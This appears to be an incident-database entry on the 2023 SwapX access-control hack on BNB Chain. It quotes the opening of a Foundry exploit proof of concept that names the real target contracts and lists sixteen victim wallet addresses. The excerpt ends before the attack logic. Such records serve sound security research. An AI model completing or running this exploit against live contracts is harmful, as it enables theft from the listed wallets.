# [?] - swapX - Access Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SwapX
Published: 2023-02-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/SwapX_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$1M
References:
- https://twitter.com/BlockSecTeam/status/1630111965942018049
- https://twitter.com/peckshield/status/1630100506319413250
- https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160

```solidity
contract ContractTest is Test {
    address swapX = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01;
    IERC20 DND = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
    address[] victims = [
        0x0b70e2Abe6F1A056E23658aED1FF9EF9901CB2A3,
        0x210C9E1d9E0572da30B2b8b9ca57E5e380528534,
        0x6906f738daFD4Bf14d6e3e979d4Aaf980FF5392D,
        0x708a34D4C5a7D7fd39eE4DB0593be18df58fd227,
        0x48ba64b8CBd8BBcE086E8e8ECc6f4De34AA35D08,
        0xBF57dea8e19022562F002Da6b7bbe2A2DB85c2c0,
        0x4148b0B927cC8246f65AF9B77dfA84b60565820c,
        0x57070188BAA313c73fffDbA43c0ABE17fbFB41f9,
        0x08943873222CE63eC48f8907757928dcb06af388,
        0x047252B87FB7ecb7e29F8026dd117EB8B8E6cF0f,
        0x8C51b7BB3f64845912616914455517DF294A0d0B,
        0x91243b8242f13299C5af661ef5d19bfE0D3bf024,
        0xfe23ea0CEC98D54A677F4aD3082D64f8A0207eB7,
        0x54D7AFCaF140fA45Ff5387f0f2954bC913c0796F,
        0x76bf18aFED5AcCFd59525D10ce15C4B8Cb64370d,
        0xe5d985b7b934dc0e0E1043Fc11f50ba9E229465C
    ];

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_023_088);
        cheats.label(address(swapX), "swapX");
        cheats.label(address(DND), "DND");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/SwapX_exp.sol_
